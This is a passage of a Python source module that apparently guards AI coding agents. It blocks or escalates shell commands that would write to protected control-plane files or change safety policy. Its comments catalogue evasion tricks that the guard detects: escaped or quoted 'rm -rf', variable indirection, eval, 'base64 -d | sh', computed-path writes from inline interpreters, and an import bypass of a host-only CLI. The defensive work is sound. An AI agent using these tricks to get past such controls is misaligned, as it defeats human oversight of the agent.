                    depth += 1
                elif text[m] in "([{":
                    depth -= 1
                    if depth == 0:
                        break
                m -= 1
            if m < 0:
                break
            while m > 0 and (text[m - 1].isalnum() or text[m - 1] in "_.$"):
                m -= 1
            pos = m
            continue
        while k > 0 and (text[k - 1].isalnum() or text[k - 1] in "_.$"):
            k -= 1
        pos = k
        break
    return text[max(pos, dot - 400):dot]


def _names_control_plane(expr: str) -> bool:
    """``expr`` names a control-plane word, unless it is ONE static path inside an agent-owned directory.

    The exemption is all-or-nothing: only a single string literal (optionally
    inside ``expanduser`` / ``Path``) whose normalized form lies inside
    ``.claude/projects/*/memory`` or ``.agentwire/wiki|artifacts`` and names no
    other control-plane word. A non-literal piece anywhere (a variable segment,
    ``os.path.join``, ``+``, ``os.pardir``, a call) means the scan cannot say
    where the path lands, so there is no exemption. A symlink INSIDE those
    directories is a declared residual.
    """
    static = next((m.group(1) for r in _STATIC_PATH_RES for m in (r.fullmatch(expr),) if m), None)
    if static is not None:
        norm = posixpath.normpath(static)
        hit = _BENIGN_PATH_RE.search(norm)
        if hit:
            expr = norm[: hit.start()] + norm[hit.end():]
    return any(w in expr.casefold() for w in _CONTROL_PLANE_WORDS)


def _string_mask(program: str) -> List[bool]:
    """``mask[i]`` is True when ``program[i]`` is inside a string literal (``'``, ``"``, triple-quoted)."""
    mask = [False] * len(program)
    i, n = 0, len(program)
    while i < n:
        ch = program[i]
        if ch in "'\"":
            q = program[i : i + 3] if program[i : i + 3] in ("'''", '"""') else ch
            j = i + len(q)
            while j < n and program[j : j + len(q)] != q:
                j += 2 if program[j] == "\\" else 1
            for k in range(i, min(j + len(q), n)):
                mask[k] = True
            i = j + len(q)
        else:
            i += 1
    return mask


def _open_writes(args: List[str], mode_index: int) -> bool:
    """``open(path, mode)`` writes unless its mode is a literal read mode (no mode = read)."""
    for a in args:
        m = re.match(r"\s*mode\s*=\s*(.*)", a, re.S)
        if m:
            return _mode_writes(m.group(1))
    return mode_index < len(args) and _mode_writes(args[mode_index])


def _mode_writes(mode: str) -> bool:
    lit = _LITERAL_ARG_RE.fullmatch(mode)
    if re.search(r"O_RDONLY", mode) and not re.search(r"O_(?:WRONLY|RDWR|CREAT|APPEND|TRUNC)", mode):
        return False
    return not lit or bool(re.search(r"[wax+>]", mode))


def _program_opaque_write(program: str) -> bool:
    """A program that hands a write/exec sink a run-time path expression that itself names the control plane."""
    if not _names_control_plane(program):
        return False
    if _INDIRECT_RE.search(program):  # getattr(__import__('os'), 'system')(...) hides which sink runs
        return True
    in_string = _string_mask(program)
    # ``os.chdir(M); os.chdir('..'); open('hooks/x', 'w')``: the working directory moves, so any
    # write whose path is not an absolute literal could land anywhere.
    moved = any(not in_string[m.start()] for m in _CHDIR_RE.finditer(program))
    for m in _CALL_RE.finditer(program):
        if in_string[m.start()]:  # ``open(p, 'w')`` quoted as DATA (a fixture, a message) is not a call
            continue
        name = m.group(1)
        open_at = m.end() - 1
        close = _match_close(program, open_at)
        args = _split_args(program[open_at + 1 : close if close > 0 else len(program)])
        dot = m.start() - 1
        method = dot >= 0 and program[dot] == "."
        receiver = _receiver_before(program, dot) if method else ""
        plain = bool(_PLAIN_RECEIVER_RE.fullmatch(receiver))
        exprs: List[str] = []
        if name in _OPEN_NAMES and (name != "new" or receiver.split(".")[-1] == "File"):
            if method and not (plain and receiver.split(".")[-1] in _SINK_MODULES | _FILE_CLASSES):
                # Path(...).open(mode): the receiver is the path
                if plain or not _open_writes(args, 0):
                    continue
                exprs = [receiver]
            else:  # open(path, mode), File.open / io.open / os.open / fs.openSync, fopen
                perl = len(args) > 1 and args[1].lstrip(" '\"").startswith((">", "+<", "+>"))
                if not (perl or _open_writes(args, 1)):
                    continue
                exprs = args[1:2] if perl else args[:1]
        elif name in ("write", "binwrite") and receiver.split(".")[-1] in _FILE_CLASSES:
            exprs = args[:1]
        elif (name in _PATH_FIRST_SINKS or name in _PATH_ALL_SINKS) and not (
            method and plain and receiver.split(".")[-1] not in _SINK_MODULES
        ) and not (not method and name == "replace"):
            exprs = args[:1] if name in _PATH_FIRST_SINKS else args
        elif name in _EXTRACT_SINKS:
            exprs = args
        elif name in _RECEIVER_SINKS and method and not plain:
            exprs = [receiver] + (args if name in ("rename", "replace", "symlink_to", "hardlink_to") else [])
        else:
            continue
        if method and not plain and name not in _RECEIVER_SINKS and name not in _OPEN_NAMES:
            exprs.append(receiver)
        for e in exprs:
            if not _LITERAL_ARG_RE.fullmatch(e) and _names_control_plane(e):
                return True
            if moved and not re.fullmatch(r'''\s*['"](?:/|~)[^'"]*['"]\s*''', e):
                return True
    return False


def _inline_programs(command: str) -> List[str]:
    """The program text of every inline interpreter in ``command``: its ``-c`` / ``-e`` argument, or its heredoc body."""
    out: List[str] = []
    if "<<" in command:
        for body, _quoted, line in _heredoc_bodies(command):
            if any(_INTERPRETER_NAME_RE.fullmatch(os.path.basename(w)) for w in _feed_words(line)):
                out.append(body)
        command = _hide_heredoc_bodies(command, keep_programs=False)
    for m in _INTERPRETER_START_RE.finditer(command):
        try:
            toks = shlex.split(command[m.start():], posix=True)
        except ValueError:
            continue
        for i, tok in enumerate(toks[1:], 1):
            if tok in (";", "|", "||", "&&", "&"):
                break
            if tok == "-r" and os.path.basename(toks[0]) != "php":
                continue
            if _INLINE_FLAG_RE.fullmatch(tok) and i + 1 < len(toks):
                out.append(toks[i + 1])
                break
    return out


def _opaque_inline_write(command: str) -> Optional[str]:
    """Why an inline interpreter program needs a human: it writes to a path it computes, and names the control plane (#1065).

    ``python3 -c "open(os.path.join(h, '.agentwire', 'damage'+'control.yml'), 'w')"``
    assembles its target at run time — no text match can read it, and no spelling
    list ever will. The unknowable SHAPE is what is refused: in the program text
    ONLY (the ``-c`` / ``-e`` argument or a heredoc fed to the interpreter, never
    the rest of the command line), a write/exec sink whose path expression is not
    one plain literal AND itself names a control-plane directory or file. A
    literal path is the verb rules' business; a control word elsewhere in the
    program (a comment, a printed string, data written), a read-only use, and the
    agent-owned ``.claude/projects/*/memory`` / ``.agentwire/wiki|artifacts`` stay
    untouched. A control word split across a variable assigned elsewhere in the
    program is a declared residual.
    """
    if any(_program_opaque_write(p) for p in _inline_programs(command)):
        return (
            "an inline interpreter program writes to a path it computes at run time "
            "and names the control plane"
        )
    return None


def unverifiable_target_verdict(
    command: str, allowed_paths: List[Dict[str, Any]], depth: int = 0
) -> Optional[str]:
    """Why ``command`` needs a human, when what it writes to is unknowable and the control plane is in play.

    A ``cd`` the scanner cannot resolve (``cd -``, ``popd``, ``cd $x``) leaves a
    later bare ``damagecontrol.yml`` pointing at any directory. Each protected
    directory is tried as that directory; when the text that follows would be a
    refused write there, the answer is an ASK, never a block (the directory may
    well be somewhere else). A ``patch`` / ``git apply`` / ``git am`` whose
    directory is a protected one is the same question: the files it rewrites
    are named only inside the diff. So is a brace expansion past the cap in a
    command that names the control plane: it cannot be enumerated, so it cannot
    be shown clean.
    """
    if depth < _RESCAN_DEPTH:
        for inner in _wrapper_payload_commands(command) + _hidden_commands(command):
            reason = unverifiable_target_verdict(inner, allowed_paths, depth + 1)
            if reason:
                return reason
    if "{" in command and mentions_control_plane(command) and brace_variants(canonicalize_command(command)) is None:
        return "a brace expansion past the cap cannot be enumerated"
    opaque = _opaque_inline_write(command)
    if opaque:
        return opaque
    known, unknown = _cwd_scopes(command)
    for cwd, rest in known:
        if cwd in _protected_dirs() or cwd == os.path.expanduser("~"):
            if _applies_diff(rest):
                return f"`patch` / `git apply` in {cwd} — the files it rewrites are named only in the diff"
    for rest in unknown:
        for d, names in _named_control_plane_files():
            new = _absolutize(rest, d)
            if new == rest or not names.intersection(map(posixpath.basename, _words(new))):
                continue
            if _check_protected_command(new, allowed_paths, 1, [_RESCAN_BUDGET])[0]:
                return (
                    "a `cd` the scanner cannot resolve precedes a write to a protected "
                    f"control-plane file name (it would be in {d} if the cd lands there)"
                )
    return None


_DIFF_READ_ONLY = frozenset({"--dry-run", "--check", "--stat", "--numstat", "--summary"})


def _applies_diff(text: str) -> bool:
    """True when some command in ``text`` applies a diff for real (``patch``, ``git apply|am``).

    Judged per simple command: a ``--dry-run`` in one command does not excuse
    the next, and the verb is matched by basename (``/usr/bin/patch``).
    """
    for seg in re.split(r"[;&|\n()]", text):
        words = _segment_words(seg)
        i = _wrapped_command_index(words)
        if i is None:
            continue
        head = os.path.basename(words[i])
        if head == "git":
            j = i + 1
            while j < len(words) and words[j].startswith("-"):
                j += 2 if words[j] in ("-C", "-c") else 1
            applies = j < len(words) and words[j] in ("apply", "am")
        else:
            applies = head == "patch"
        if applies and not _DIFF_READ_ONLY.intersection(words[i:]):
            return True
    return False


def _derived_commands(command: str) -> List[str]:
    """Commands hidden inside ``command`` that must be judged as commands themselves."""
    # A quoted-delimiter heredoc body is DATA (a commit message about ``cd <dir>
    # && touch <file>`` must not be read as that command): the rewriting
    # generators see the command without it. Bodies that feed a shell or runner
    # stay (``_neutralize_literal_heredocs`` keeps them), and the stdin-program
    # pass reads the full text, so a quoted body handed to ``ssh host`` is still
    # judged as the program it is.
    visible = _hide_heredoc_bodies(command, keep_programs=True) if "<<" in command else command
    derived = (
        _wrapper_payload_commands(visible)
        + _heredoc_substitution_commands(command)
        + _hidden_commands(command)
        + _redirect_variant(visible)
        + _normalized_path_variant(visible)
        + _brace_variants_of(visible)
        + _glob_variants(visible)
        + _cwd_variants(visible)
        + _realpath_variants(visible)
        + _cwd_realpath_variants(visible)
    )
    return list(dict.fromkeys(derived))[:_RESCAN_FANOUT]


def check_protected_command(
    command: str,
    allowed_paths: List[Dict[str, Any]],
) -> Tuple[bool, str]:
    """Block a bash command that writes/edits/deletes a control-plane file.

    Mirrors the ``readOnlyPaths`` matcher but is escape-hatch- and
    kill-switch-exempt. The user's allowlist may re-permit a specific path.

    Matches against masked subcommands (quotes/escapes resolved — ``r\\m``,
    ``r''m`` still normalize to the literal form) with path-mentioning content
    kept visible, so a *read* whose quoted search string merely mentions a
    destructive verb is no longer refused as a control-plane write (#922),
    while every spelling that pairs a real verb with a protected path still is.
    """
    # ``$HOME`` / ``${HOME}`` / ``~`` name the same file as its absolute form;
    # the ladder patterns carry the ``~`` and expanded spellings of each path.
    return _check_protected_command(
        command, control_plane_allowlist(allowed_paths), 0, [_RESCAN_BUDGET]
    )


def _check_protected_command(
    command: str,
    allowed_paths: List[Dict[str, Any]],
    depth: int,
    budget: List[int],
) -> Tuple[bool, str]:
    command = canonicalize_command(command)
    if depth < _RESCAN_DEPTH:
        for derived in _derived_commands(command):
            if budget[0] <= 0:
                break
            budget[0] -= 1
            blocked, reason = _check_protected_command(derived, allowed_paths, depth + 1, budget)
            if blocked:
                return blocked, reason
    subcommands, _ambiguous = normalize_subcommands(command)
    raw_haystacks = [command] + [s for s in subcommands if s and s != command]
    raw_haystacks += [f for f in map(fold_string_concat, raw_haystacks) if f not in raw_haystacks]
    for masked in masked_subcommands(command):
        into = _extracts_into_protected_dir(masked)
        if into and not is_path_allowed_for_op(
            os.path.expanduser(into) + "/x", allowed_paths, "write"
        ):
            return True, _protected_reason(into)
    for path in _protected_path_patterns():
        # The interpreter patterns are the fail-closed net for OPAQUE program
        # text (#678) — a heredoc body is exactly what masking strips, so they
        # keep reading the raw haystacks. Only the shell-level write/delete
        # patterns move to the masked ladder haystacks.
        interp_hays = [redact_prose_mentions(h, path) for h in raw_haystacks]
        ladder = path_ladder_haystacks(command, path)
        writer_hays = path_ladder_haystacks(_blank_prose_args(command, path), path)
        for synth in _xargs_rescans(command, path):
            ladder += path_ladder_haystacks(synth, path)
            writer_hays += path_ladder_haystacks(synth, path)
            interp_hays.append(redact_prose_mentions(synth, path))
        for hays, patterns in (
            (ladder, READ_ONLY_BLOCKED),
            (writer_hays, PROTECTED_WRITER_PATTERNS),
            (interp_hays, INTERPRETER_WRITE_PATTERNS),
        ):
            for hay in hays:
                matched, reason = check_path_patterns(
                    hay,
                    path,
                    patterns,
                    "protected control-plane path",
                )
                if matched:
                    op = _infer_operation_from_reason(reason)
                    if is_command_path_allowed(command, allowed_paths, op):
                        break
                    reason = _protected_reason(path)
                    if _refused_for_quoted_substitution(command, allowed_paths, depth, budget):
                        reason += _SUBSTITUTION_HINT
                    return True, reason
    return False, ""


_DQ_SUBSTITUTION_SPAN = _rx(r'"[^"\n]*(?:\$\(|`)[^"\n]*"')
_SUBSTITUTION_HINT = (
    " — a command substitution inside a double-quoted argument that names a "
    "protected path is refused because it executes; put the text in single "
    "quotes or move the substitution out of the string"
)


def _refused_for_quoted_substitution(
    command: str, allowed_paths: List[Dict[str, Any]], depth: int, budget: List[int]
) -> bool:
    """True when the block is caused by a substitution inside a double-quoted arg (#1100).

    Judged by the counterfactual: the command is refused as written and allowed
    once those substitutions are taken out of their strings.
    """
    stripped = _DQ_SUBSTITUTION_SPAN.sub('""', command)
    return stripped != command and not _check_protected_command(stripped, allowed_paths, depth + 1, budget)[0]


# ============================================================================
# PROTECTED COMMANDS (escape-hatch- AND kill-switch-EXEMPT, like the protected
# control plane above, but keyed on COMMAND SHAPE rather than a file path)
# ============================================================================
#
# Some operations are dangerous no matter which file they touch — running
# them at all IS the confused-deputy escape, not merely writing a particular
# path. ``agentwire tasks promote`` is the first case (#720/#721 review):
# it's the host-trusted program that copies a vetted draft into the protected
# ``.agentwire.tasks.yml``. If a policed/unattended agent could just invoke
# the CLI itself, the file protection above is moot — so this, like the
# protected-path check, is evaluated before ``detect_escape_hatch`` and the
# kill switch, and has NO allowlist override (there's no legitimate reason
# for an agent to ever run this; unlike a path, there's nothing to allowlist
# it TO). This is defense in depth on TOP OF ``cmd_tasks_promote``'s own
# runtime refusal (unattended check + host-context gate in ``tasks_cli.py``)
# — that second gate is what actually closes the ``python3 -c
# "from agentwire.tasks_cli import cmd_tasks_promote; ..."`` bypass, since a
# raw interpreter call never matches a bash command pattern at all.

PROTECTED_COMMAND_PATTERNS: List[Tuple[str, str]] = [
    (
        r'\bagentwire\s+tasks\s+promote\b',
        "agentwire tasks promote writes the protected .agentwire.tasks.yml — "
        "host-only, run it from your own terminal (not through an agent).",
    ),
    (
        r'\bagentwire\s+safety\s+(?:packs|groups)\s+(?:enable|disable)\b',
        "agentwire safety packs/groups enable|disable changes damage-control "
        "policy — host-only, run it from your own terminal (not through an agent).",
    ),
]


def check_protected_bash_command(command: str) -> Tuple[bool, str]:
    """Block a command matching a ``PROTECTED_COMMAND_PATTERNS`` entry.

    Unconditional — no allowlist override, no escape hatch, no kill switch
    (see module note above). These are COMMAND-PREFIX patterns, so — like the
    ``anchored`` tooldef bashToolPatterns (#675) — matched only against
    ``masked_subcommands``: quoting/escaping of the command itself still
    normalizes to the literal form (``agentwire tasks prom''ote`` can't sneak
    past), but quoted CONTENT (a commit message, an echo string) that merely
    *mentions* the phrase is masked out first, so it can't false-match.
    """
    haystacks = masked_subcommands(command)
    for pattern, reason in PROTECTED_COMMAND_PATTERNS:
        for hay in haystacks:
            try:
                if _rx(pattern).search(hay):
                    return True, reason
            except re.error:
                continue
    return False, ""


_ESCAPE_HATCH_RE = re.compile(r"#\s*allow:[ \t]*([^\n]+)", re.IGNORECASE)


def detect_escape_hatch(command: str) -> Optional[str]:
    """Return the reason if ``command`` contains a ``# allow: <reason>`` marker.

    Non-empty reason required; matches the rest of the comment line so the
    marker works on multi-line / chained commands too.
    """
    if not command:
        return None
    m = _ESCAPE_HATCH_RE.search(command)
    if not m:
        return None
    reason = m.group(1).strip()
    return reason or None


# ============================================================================
# SHELL-AWARE NORMALIZATION
# ============================================================================
#
# The bash matcher historically ran the rule regexes against the RAW command
# string. With no tokenization, trivial shell quoting/escaping defeated every
# rule: ``r\m -rf /x`` (backslash), ``r''m -rf /x`` (empty quotes),
# ``R=rm; $R -rf /x`` ($VAR indirection) all read as ALLOWED while literal
# ``rm -rf /x`` blocked. We now ALSO match against a normalized form where
# quotes/escapes are removed (via ``shlex``) and simple ``$VAR`` assignments are
# resolved, split per subcommand. Anything we cannot tokenize safely — command
# substitution (``$(...)`` / backticks), ``eval``, a ``base64 -d | sh`` pipeline,
# or unbalanced quotes — escalates to ``ask``. How that ask RESOLVES depends on
# mode, and saying "fails closed" unqualified here was #934's complaint: it is a
# block when unattended, a dialog when interactive, and under
# bypassPermissions/auto it resolves to ALLOW **unless** the shape conceals the
# verb (``ambiguity_conceals_verb``) — eval, base64-pipe, unbalanced quotes, or
# a substitution deciding what runs / feeding a wrapper's payload — in which
# case the hooks keep the ask even under bypass. Only operand-position
# substitution (``echo "$(basename $p)"``) is demoted by bypass.

_SUBSTITUTION_RE = re.compile(r"\$\(|`")

# Launchers that keep the command position open, with the options that TAKE A
# VALUE. The table only REDUCES false blocks for launchers we know
# (``sudo -E grep eval f`` is a grep); it never decides an allow. A launcher in
# neither this table nor _EVAL_DATA_CONSUMERS is UNKNOWN, and for an unknown
# command every later word is scanned (see _eval_unknown): the failure direction
# is ask, not allow.
_EVAL_WRAPPER_VALUE_OPTS: Dict[str, frozenset] = {
    "sudo": frozenset({"-u", "-g", "-h", "-p", "-C", "-D", "-R", "-T", "-U", "-r", "-t", "-a", "-c",
                       "--user", "--group", "--host", "--prompt", "--close-from", "--chdir",
                       "--chroot", "--role", "--type", "--login-class", "--other-user"}),
    "doas": frozenset({"-u", "-C"}),
    "env": frozenset({"-u", "-C", "-S", "-P", "--unset", "--chdir", "--split-string"}),
    "xargs": frozenset({"-I", "-n", "-L", "-P", "-s", "-d", "-a", "-E", "-J", "-R", "-S",
                        "--max-args", "--max-procs", "--delimiter", "--arg-file", "--max-lines",
                        "--max-chars", "--eof"}),
    "timeout": frozenset({"-k", "-s", "--kill-after", "--signal"}),
    # ``flock [opts] LOCK cmd …`` / ``flock LOCK -c 'cmd'`` (#14); ``parallel [opts] cmd ::: args`` —
    # everything after ``:::`` is data (#14).
    "flock": frozenset({"-w", "-E", "--timeout", "--wait", "--conflict-exit-code"}),
    "parallel": _PARALLEL_VALUE_OPTS,
    "nice": frozenset({"-n", "--adjustment"}),
    "ionice": frozenset({"-c", "-n", "-p", "--class", "--classdata", "--pid"}),
    "stdbuf": frozenset({"-i", "-o", "-e", "--input", "--output", "--error"}),
    "time": frozenset({"-f", "-o", "--format", "--output"}),
    "watch": frozenset({"-n", "--interval"}),
    "exec": frozenset({"-a"}),
    "nohup": frozenset(), "command": frozenset(), "builtin": frozenset(), "setsid": frozenset(),
    # package launchers: ``uv run [opts] <tool>``, ``npx [opts] <tool>``. A value option missing here
    # leaves its value in the verb slot, which is an UNKNOWN word and asks (never allows).
    "uv": frozenset({"--with", "--python", "-p", "--directory", "--project", "--extra", "--group",
                     "--env-file", "--with-requirements", "--index", "--package", "--from"}),
    "uvx": frozenset({"--from", "--with", "--python", "-p", "--with-requirements"}),
    "npx": frozenset({"-p", "--package", "--cache", "--userconfig", "-c", "--call"}),
    "bunx": frozenset(), "pnpx": frozenset(),
    "poetry": frozenset({"-C", "--directory", "--project", "-P"}),
}
# Subcommands after which the rest names a package, unit, image or resource: data, whatever its spelling.
_EVAL_DATA_SUBCOMMANDS: Dict[str, frozenset] = {
    "uv": frozenset({"add", "remove", "sync", "lock", "pip", "tree", "init", "build", "publish"}),
    "docker": frozenset({"build", "images", "ps", "logs", "pull", "push", "inspect", "tag", "rmi", "stop", "rm"}),
    "kubectl": frozenset({"get", "describe", "logs", "apply", "delete", "config", "rollout", "top"}),
    "helm": frozenset({"template", "install", "upgrade", "lint", "list", "repo", "show", "uninstall"}),
    "brew": frozenset({"install", "uninstall", "upgrade", "info", "search", "list", "update", "reinstall"}),
    "pip": frozenset({"install", "uninstall", "show", "download", "freeze", "list"}),
    "pip3": frozenset({"install", "uninstall", "show", "download", "freeze", "list"}),
    "systemctl": frozenset({"restart", "start", "stop", "status", "enable", "disable", "reload", "is-active", "show"}),
    "journalctl": frozenset(),
}
# Subcommand words a launcher takes before the program it launches (``uv run``).
_EVAL_WRAPPER_SUBCOMMANDS = {"uv": ("run",), "poetry": ("run",)}
# The option whose value is a program, per launcher (``env -S``, ``npx -c``).
_EVAL_PAYLOAD_OPTS = {"env": ("S", "--split-string"), "npx": ("c", "--call")}
# Commands that only READ their arguments: the word after them is data, not a verb.
_EVAL_DATA_CONSUMERS = frozenset({
    "echo", "printf", "grep", "egrep", "fgrep", "zgrep", "rg", "ag", "ack", "cat", "bat", "less",
    "more", "head", "tail", "wc", "sort", "uniq", "cut", "tr", "sed", "awk", "gawk", "diff", "cmp",
    "comm", "jq", "yq", "ls", "tree", "mkdir", "touch", "rm", "cp", "mv", "ln", "stat", "file",
    "man", "info", "which", "type", "whereis", "whatis", "whence", "help", "git", "gh", "agentwire",
    "tee", "curl", "wget", "open", "pbcopy", "sleep", "date", "true", "false", "test", "[", "read", "mapfile", "readarray",
    "cd", "pwd", "export", "unset", "python", "python2", "python3", "node", "ruby", "perl", "php",
    "deno", "bun", "lua", "luajit", "tclsh", "wish", "R", "Rscript", "julia", "groovy", "osascript",
    "expect", "pytest", "ruff", "pip", "ssh-keygen", "scp", "sftp", "rsync",
    "say", "jest", "vitest", "mocha", "tsc", "eslint", "prettier", "dotnet", "tar", "zip", "unzip", "gzip", "gunzip", "base64", "openssl", "shasum", "md5", "du", "df", "ps",
    "kill", "pkill", "pgrep", "lsof", "chmod", "chown", "basename", "dirname", "realpath", "readlink",
    "xxd", "hexdump", "od", "strings", "nl", "fold", "fmt", "column", "paste", "join", "split",
})
# Interpreters read stdin as THEIR language, not as shell: a body piped to one is not shell text.
_EVAL_INTERPRETERS = frozenset({
    "perl", "python", "python2", "python3", "node", "ruby", "php", "deno", "bun",
    "lua", "luajit", "tclsh", "wish", "R", "Rscript", "julia", "groovy", "osascript", "expect",
})
_EVAL_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "su", "ash", "fish", "csh", "tcsh", "source", "."})
# Project runners whose arguments are targets / script names / test selectors (``make eval``,
# ``cargo test eval``, ``npm run eval``): data, unless the invocation can hand a program to a
# shell (``exec``/``dlx``/``x`` subcommands, a shell name, ``SHELL=``), which falls back to UNKNOWN.
_EVAL_PROJECT_RUNNERS = frozenset({"make", "just", "cargo", "npm", "pnpm", "yarn", "fd", "go", "bundle"})
_EVAL_REDIRECT_RE = _rx(r"^(?:\d+|\{[A-Za-z_]\w*\})?(?:>>?|<<<?|<>|>\||<&|>&|&>>?|<)(.*)$", 0)
_EVAL_PROCSUB_RE = _rx(r"[<>]\(", 0)
_EVAL_PROCSUB_BODY_RE = _rx(r"[<>]\(([^()]*)\)", 0)
# fd duplication / closing (``2>&1``, ``>&2``, ``<&-``, ``{fd}>&-``) carries no word of its own;
# ``&>`` / ``>|`` are plain redirects whose ``&`` / ``|`` the tokenizer would read as separators.
_EVAL_FD_DUP_RE = _rx(r"(?:\{[A-Za-z_]\w*\}|\d+)?[<>]&[\d-]*", 0)
_EVAL_AMP_REDIRECT_RE = _rx(r"&>>?|>\|", 0)
_EVAL_ANSI_QUOTE_RE = _rx(r"\$'((?:[^'\\]|\\.)*)'", 0)
_EVAL_DOLLAR_DQUOTE_RE = _rx(r"\$(?=\")", 0)
_EVAL_ALIAS_ASSIGN_RE = _rx(r"(?:^|[\s;&|(])([A-Za-z_]\w*)=(?:'eval\b|\"eval\b|eval(?=[\s;&|)]|$))", 0)
_EVAL_FOR_LIST_RE = _rx(r"(?:^|[\s;&|(])(?:for|select)\s+([A-Za-z_]\w*)\s+in\s+([^;\n]*)", 0)
_EVAL_READ_RE = _rx(r"(?:^|[\s;&|(])(read|mapfile|readarray)\b([^;&|\n<]*)", 0)
_EVAL_ALIAS_COPY_RE = _rx(r"(?:^|[\s;&|(])([A-Za-z_]\w*)=[\"']?\$\{?([A-Za-z_]\w*)", 0)
_EVAL_ESCAPE_RE = _rx(r"\\(?:x([0-9A-Fa-f]{1,2})|([0-7]{1,3})|(.))", re.DOTALL)
_EVAL_TMUX_RUNNERS = frozenset({"new-session", "new", "new-window", "neww", "split-window", "splitw",
                                "respawn-pane", "respawnp", "respawn-window", "respawnw", "run-shell", "run", "if-shell", "if"})
_EVAL_FIND_EXEC = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
_EVAL_ESCAPES = {"n": "\n", "t": "\t", "r": "\r", "\\": "\\", "a": "\a", "b": "\b", "f": "\f", "v": "\v", "e": "\x1b"}


def _eval_unescape(text: str) -> str:
    """Backslash escapes as ``echo -e`` / ``printf`` / ``$'…'`` expand them."""
    def sub(m):
        if m.group(1) is not None:
            return chr(int(m.group(1), 16))
        if m.group(2) is not None:
            return chr(int(m.group(2), 8) & 0xFF)
        return _EVAL_ESCAPES.get(m.group(3), "\\" + m.group(3))
    return _EVAL_ESCAPE_RE.sub(sub, text)


def _eval_decode_dollar_quotes(command: str) -> str:
    """``$'a\\neval x'`` -> ``'a<NL>eval x'`` and ``$"x"`` -> ``"x"``: the tokenizer knows neither."""
    def sub(m):
        return "'" + _eval_unescape(m.group(1)).replace("'", "'\\''") + "'"
    return _EVAL_DOLLAR_DQUOTE_RE.sub("", _EVAL_ANSI_QUOTE_RE.sub(sub, command))


def _eval_shell_consumer(words: List[str]) -> bool:
    """Whether ``words`` (one command, or a pipeline) feeds its stdin to a SHELL, not to an interpreter."""
    # compound openers (``do sh``, ``then bash``) head their stage: strip them per stage first
    stages: List[List[str]] = [[]]
    for w in words:
        if w in _WORD_OPERATORS:
            stages.append([])
        else:
            stages[-1].append(w)
    words = [w for k, st in enumerate(stages) for w in (["|"] if k else []) + strip_command_opener_words(st)]
    if _eval_makefile_reader(words):
        return True
    if not _stdin_is_program(words):
        return False
    names = {os.path.basename(w) for w in words}
    return bool(names & _EVAL_SHELLS) or not (names & _EVAL_INTERPRETERS)


_EVAL_PROGRAM_FILE_HEADS = frozenset({"make", "gmake", "just"})
_EVAL_FILE_LONG_OPTS = frozenset({"--file", "--makefile", "--justfile"})


def _eval_file_operands(words: List[str]) -> Tuple[List[str], bool]:
    """``(file operands, pending)`` of a make/just invocation's file options.

    ``-f F``, ``-fF``, clusters (``-sf F``), ``--file|--makefile|--justfile`` as ``=F`` or ``F``.
    ``pending`` is True when the last option still awaits its value (the next word, e.g. a
    ``<(…)`` that the caller cut out of the line).
    """
    vals: List[str] = []
    pending = False
    i, n = 0, len(words)
    while i < n:
        w = words[i]
        pending = False
        if w.startswith("--"):
            name, eq, val = w.partition("=")
            if name in _EVAL_FILE_LONG_OPTS:
                if eq:
                    vals.append(val)
                    pending = val == ""
                elif i + 1 < n:
                    vals.append(words[i + 1])
                    i += 1
                else:
                    pending = True
        elif w.startswith("-") and len(w) > 1:
            k = w.find("f", 1)
            if k != -1 and (w[1:k].isalpha() or k == 1):
                if len(w) > k + 1:
                    vals.append(w[k + 1 :])
                elif i + 1 < n:
                    vals.append(words[i + 1])
                    i += 1
                else:
                    pending = True
        i += 1
    return vals, pending


def _eval_is_stdin_operand(v: str) -> bool:
    return v in ("-", "/dev/stdin") or v.startswith(("/dev/fd/", "/proc/self/fd/"))


def _eval_makefile_reader(words: List[str]) -> bool:
    """``make -f -`` / ``-f /dev/stdin|/dev/fd/N`` / ``just --justfile -``: the file text is a program of shell recipes."""
    for i, w in enumerate(words):
        if os.path.basename(w) in _EVAL_PROGRAM_FILE_HEADS:
            vals, _pending = _eval_file_operands(words[i + 1 :])
            if any(_eval_is_stdin_operand(v) for v in vals):
                return True
    return False


def _eval_sed_script_reader(words: List[str]) -> bool:
    """``sed -f -`` / ``-f /dev/stdin``: the script arrives on stdin."""
    return bool({os.path.basename(w) for w in words} & {"sed", "gsed"}) and any(
        (a in ("-f", "--file") and _eval_is_stdin_operand(b))
        or (a.startswith("-f") and _eval_is_stdin_operand(a[2:]))
        or (a.startswith("--file=") and _eval_is_stdin_operand(a[7:]))
        for a, b in zip(words, words[1:] + [""])
    )


def _eval_producer_texts(stage: str) -> List[str]:
    """Candidate program texts one pipeline stage writes: a here-string, or ``echo``/``printf`` output
    both as written (``\\eval`` stays an escaped spelling) and escape-expanded."""
    out: List[str] = []
    m = _HERE_STRING_RE.search(stage)
    if m:
        out.append(" ".join(_words(m.group(1))))
    words = strip_command_opener_words(_words(stage))
    if words and os.path.basename(words[0]) in ("echo", "printf"):
        raw = " ".join(words[1:])
        out += [raw, _eval_unescape(raw)]
    return out


def _eval_fed_programs(command: str, consumer=None) -> List[str]:
    """Text handed to a shell on its stdin: heredoc / here-string bodies, piped ``echo``, ``<(…)`` bodies."""
    consumer = consumer or _eval_shell_consumer
    shell_kind = consumer is _eval_shell_consumer
    out: List[str] = []
    for h in _heredocs(command):
        if consumer(_feed_words(h.line)):
            out.append(h.body)
    for m in _here_strings(command):
        line = command[command.rfind("\n", 0, m.start()) + 1 : m.start()]
        if consumer(_feed_words(line)):
            out.append(" ".join(_words(m.group(1))))
    stages = _pipe_stages(_hide_heredoc_bodies(command, keep_programs=False)) if "|" in command else []
    for k, (op, stage) in enumerate(stages):
        words = _feed_words(stage)
        if op != "|" or not (
            consumer(words)
            or (shell_kind and "xargs" in words and any(os.path.basename(w) in _SHELL_NAMES for w in words))
        ):
            continue
        # the shell consumes the stdout of EVERY stage before it in this pipeline,
        # through whatever pass-through stages (tee, cat, sed, base64 -d …) sit between
        j = k - 1
        while j >= 0:
            out.extend(_eval_producer_texts(stages[j][1]))
            if stages[j][0] != "|":
                break
            j -= 1
    for m in _EVAL_PROCSUB_BODY_RE.finditer(command if shell_kind else ""):
        prefix = re.split(r"[;&|\n]", command[: m.start()])[-1]
        pwords = _words(_EVAL_PROCSUB_BODY_RE.sub(" ", prefix))
        heads = {os.path.basename(w) for w in pwords}
        if _EVAL_SHELLS & heads or (heads & _EVAL_PROGRAM_FILE_HEADS and _eval_file_operands(pwords)[1]):
            for _op, stage in _pipe_stages(m.group(1)):
